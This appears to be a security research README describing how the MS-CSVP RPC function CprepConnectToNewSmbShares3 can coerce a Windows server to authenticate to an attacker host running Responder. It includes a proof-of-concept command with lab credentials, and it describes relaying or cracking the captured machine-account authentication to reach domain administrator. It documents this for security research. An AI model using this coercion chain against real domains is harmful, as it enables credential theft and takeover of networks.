# MS-CSVP - Remote call to CprepConnectToNewSmbShares3 (opnum 8)

## Summary

 - **Protocol**: [[MS-CSVP]: Failover Cluster: Setup and Validation Protocol (ClusPrep)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/600931f0-739b-4c09-8ddf-05555438c279)

 - **Protocol UUID**: 12108a88-6858-4467-b92f-e6cf4568dfb6

 - **Protocol version**: 0.0

 - **SMB Named pipe**: ``

 - **Function name**: [`CprepConnectToNewSmbShares3`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/aa2f7339-c1f7-473b-a2b7-94838b6657d4)

 - **Function operation number**: `8`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-CSVP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/600931f0-739b-4c09-8ddf-05555438c279) protocol (with uuid `12108a88-6858-4467-b92f-e6cf4568dfb6` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-CSVP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/600931f0-739b-4c09-8ddf-05555438c279) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-CSVP]: Failover Cluster: Setup and Validation Protocol (ClusPrep)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/600931f0-739b-4c09-8ddf-05555438c279) and allows to call RPC functions of this protocol. We will then call the remote [`CprepConnectToNewSmbShares3`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/aa2f7339-c1f7-473b-a2b7-94838b6657d4) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
CprepConnectToNewSmbShares3('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT CprepConnectToNewSmbShares3(
   [in, string, size_is(dwNumberOfPaths,)] 
     LPWSTR* ppwszSharePaths,
   [in] DWORD dwNumberOfPaths
 );
```

## References

 - Documentation of protocol [MS-CSVP]: Failover Cluster: Setup and Validation Protocol (ClusPrep): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/600931f0-739b-4c09-8ddf-05555438c279

 - Documentation of function `CprepConnectToNewSmbShares3`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/aa2f7339-c1f7-473b-a2b7-94838b6657d4